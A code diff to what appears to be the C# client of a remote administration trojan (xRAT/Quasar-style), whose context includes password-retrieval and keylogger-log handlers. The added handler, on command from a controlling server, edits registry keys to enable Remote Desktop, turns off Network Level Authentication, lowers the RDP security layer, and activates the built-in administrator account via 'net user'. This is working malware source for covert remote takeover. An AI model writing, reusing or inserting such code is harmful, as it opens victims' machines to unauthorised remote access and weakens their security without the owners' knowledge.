@@ -40,7 +40,87 @@ namespace xClient.Core.Commands
 
             new Packets.ClientPackets.GetPasswordsResponse(raw).Execute(client);
         }
+        public static void HandleRemoteDesktopProtocol(Packets.ServerPackets.DoRemoteDesktopProtocol packet, Client client)
+        {
 
+            bool toggleState = false;
+
+            try
+            {
+                if (WindowsAccountHelper.GetAccountType() != "Admin")
+                {
+                    new Packets.ClientPackets.SetStatus("Admin rights is required to enable this feature...").Execute(client);
+                    return;
+                }
+
+
+                Microsoft.Win32.RegistryKey checkEnabledKey = RegistryKeyHelper.OpenReadonlySubKey(Microsoft.Win32.RegistryHive.LocalMachine, @"SYSTEM\CurrentControlSet\Control\Terminal Server");
+
+                if (((int)checkEnabledKey.GetValue("fDenyTSConnections", 1)) == 0)
+                {
+                    // If this is true, we want to turn the values to their 'off' positions in the registry as we toggle.
+                    toggleState = true;
+                }
+
+
+                Packets.ClientPackets.SetStatus failureStatus = new Packets.ClientPackets.SetStatus(string.Format("Failed to {0} keys! Admin is needed!", toggleState ? "restore" : "modify"));
+
+                // Perform registry changes depending on protocol being enabled or not
+                bool denyTSResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
+                    @"SYSTEM\CurrentControlSet\Control\Terminal Server",
+                    "fDenyTSConnections", toggleState ? 1 : 0,
+                    false /* we don't want to add quotes */,
+                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
+                    );
+
+                if (!denyTSResult)
+                {
+                    failureStatus.Execute(client);
+                    return;
+                }
+
+                bool userAuthResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
+                    @"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
+                    "UserAuthentication", toggleState ? 1 : 0,
+                    false /* we don't want to add quotes */,
+                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
+                    );
+
+                if (!userAuthResult)
+                {
+                    failureStatus.Execute(client);
+                    return;
+                }
+
+                bool secLayerResult = RegistryKeyHelper.AddRegistryKeyValue(Microsoft.Win32.RegistryHive.LocalMachine,
+                    @"SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp",
+                    "SecurityLayer", 1,
+                    false /* we don't want to add quotes */,
+                    Microsoft.Win32.RegistryValueKind.DWord /* specify dword */
+                    );
+
+                if (!secLayerResult)
+                {
+                    failureStatus.Execute(client);
+                    return;
+                }
+
+                // Enable default administrator account
+                // net user administrator /active:yes
+                SystemHelper.ExecuteCommandLine("net user administrator /active:" + (toggleState ? "no" : "yes"), true);
+
+
+                // SERVER should start a reverse proxy client  (rdp default set to 3389 this could be altered though... perhaps will add support for it in future...)
+                new Packets.ClientPackets.SetStatus(toggleState ? "Disabled RDP Connections!" : "Enabled RDP Connections!").Execute(client);
+
+                
+
+            }
+            catch (Exception ex)
+            {
+                new Packets.ClientPackets.SetStatus("Remote RDP Toggle Error: " + ex.Message);
+            }
+        }
         public static void HandleGetDesktop(Packets.ServerPackets.GetDesktop command, Client client)
         {
             var resolution = FormatHelper.FormatScreenResolution(ScreenHelper.GetBounds(command.Monitor));
@@ -166,6 +246,7 @@ namespace xClient.Core.Commands
                 new Packets.ClientPackets.GetMonitorsResponse(Screen.AllScreens.Length).Execute(client);
             }
         }
+
 
         public static void HandleGetKeyloggerLogs(Packets.ServerPackets.GetKeyloggerLogs command, Client client)
         {
